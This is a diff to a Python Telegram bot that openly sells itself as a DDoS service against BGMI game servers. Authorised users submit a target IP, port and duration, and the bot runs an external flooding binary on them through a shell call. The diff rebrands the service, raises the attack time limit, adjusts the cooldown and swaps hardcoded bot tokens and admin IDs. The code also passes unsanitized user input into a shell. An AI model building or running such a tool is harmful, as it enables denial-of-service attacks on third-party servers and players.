@@ -4,10 +4,10 @@ import datetime
 import os
 
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('8140711870:AAHBh5iR1pFx5GJIiBWQsy3iToOMAlL4PqA')
+bot = telebot.TeleBot('7773167645:AAGJel0q5Quylehek2XZcvzj0l00UBegofE')
 
 # Admin user IDs
-admin_id = {"7220480138", "5707956654"}
+admin_id = {"5666606072", "7658271196"}
 USER_FILE = "users1.txt"
 LOG_FILE = "log1.txt"
 
@@ -89,7 +89,7 @@ def add_user(message):
         else:
             response = "Please specify a user ID to add 😒."
     else:
-        response = "Lusu Punda 🤣"
+        response = "You dont have access to that command ❎"
 
     bot.reply_to(message, response)
 
@@ -114,7 +114,7 @@ def remove_user(message):
             response = '''Please Specify A User ID to Remove. 
 ✅ Usage: /remove <userid>'''
     else:
-        response = "Lusu Punda 🤣"
+        response = "You dont have access to that command ❎"
 
     bot.reply_to(message, response)
 
@@ -134,7 +134,7 @@ def clear_logs_command(message):
         except FileNotFoundError:
             response = "Logs are already cleared ."
     else:
-        response = "Poda Sunni 🤣"
+        response = "You dont have access to that command ❎"
     bot.reply_to(message, response)
 
  
@@ -160,7 +160,7 @@ def show_all_users(message):
         except FileNotFoundError:
             response = "No data found "
     else:
-        response = "Gomma Punda 🤣"
+        response = "You dont have access to that command ❎"
     bot.reply_to(message, response)
 
 
@@ -179,7 +179,7 @@ def show_recent_logs(message):
             response = "No data found "
             bot.reply_to(message, response)
     else:
-        response = "Thaiyoli Punda 🤣"
+        response = "You dont have access to that command ❎"
         bot.reply_to(message, response)
 
 
@@ -193,12 +193,12 @@ def start_attack_reply(message, ip, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, ✅🔥𝘾𝙊𝙉𝙂𝙍𝘼𝙏𝙐𝙇𝘼𝙏𝙄𝙊𝙉𝙎🔥✅\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {ip}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: FUCK\n\n🌟 DDOS KING UH DA!💀"
+    response = f"{username}, 🚀 𝗔𝗧𝗧𝗔𝗖𝗞 𝗜𝗡𝗜𝗧𝗜𝗔𝗧𝗘𝗗 🚀\n\n✈️𝐓𝐚𝐫𝐠𝐞𝐭: {ip}\n🚀𝐏𝐨𝐫𝐭: {port}\n🕰️𝐓𝐢𝐦𝐞: {time}𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n💣𝐌𝐞𝐭𝐡𝐨𝐝: ERRORxENGINE\n\n❌ 𝗗𝗢𝗡𝗧 𝗔𝗧𝗧𝗔𝗖𝗞 𝗔𝗡𝗬𝗢𝗡𝗘 𝗪𝗛𝗜𝗟𝗘 𝗢𝗡𝗘 𝗜𝗦 𝗜𝗡 𝗣𝗥𝗢𝗚𝗥𝗘𝗦𝗦 🏴"
     bot.reply_to(message, response)
 
 bgmi_cooldown = {}
 
-COOLDOWN_TIME =0
+COOLDOWN_TIME =10
 
 @bot.message_handler(commands=['bgmi'])
 def handle_bgmi(message):
@@ -207,7 +207,7 @@ def handle_bgmi(message):
         if user_id not in admin_id:
             
             if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 3:
-                response = "You Are On Cooldown . Please Wait 5min Before Running The /bgmi Command Again."
+                response = "You Are On Cooldown . Please Wait 10sec Before Running The /bgmi Command Again."
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
@@ -218,19 +218,19 @@ def handle_bgmi(message):
             ip = command[1]
             port = int(command[2])  
             time = int(command[3])  
-            if time > 241:
-                response = "Error: Time interval must be less than 240."
+            if time > 281:
+                response = "Error: Time interval must be less than 280."
             else:
                 record_command_logs(user_id, '/bgmi_compiled', ip, port, time)
                 log_command(user_id, ip, port, time)
                 start_attack_reply(message, ip, port, time)  
-                full_command = f"./dini {ip} {port} {time}"
+                full_command = f"./smokey {ip} {port} {time} 1200"
                 subprocess.run(full_command, shell=True)
-                response = f"✅ Attack Successfully Completed 🇮🇳 ip: {ip} port: {port} sec: {time}"
+                response = f"✅ Attack Successfully Completed\n\nYou can start Another Attack Now 💣"
         else:
             response = "✅ Currently Available: /bgmi <ip> <port> <time>"  
     else:
-        response = " ACCESS VAANGUDA SUNNI PUNDA 🤣."
+        response = " Great ! You dont have access to attack , Contact Admin immediately."
 
     bot.reply_to(message, response)
 
@@ -250,7 +250,7 @@ def show_command_logs(message):
         except FileNotFoundError:
             response = "No command logs found."
     else:
-        response = "OTHA 🤣"
+        response = "You dont have access to that command ❎"
 
     bot.reply_to(message, response)
 
@@ -280,10 +280,11 @@ def show_help(message):
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f"""🌟 Welcome to the DINI Family, {user_name}! 🌟
+    response = f"""🚀 Welcome to ERRORxENGINE DDoS service, {user_name}! 🌟
 
 🎮 Ready to dominate BGMI? You're in the right place!  
-🔹 Stay sharp, play smart, and enjoy the game.  
+🔹 Stay sharp, play smart, and enjoy the game. 
+💣 You must follow the bot rules to avoid a ban from bot ❎
 
 🤖 Need help? Use: /help  
 """
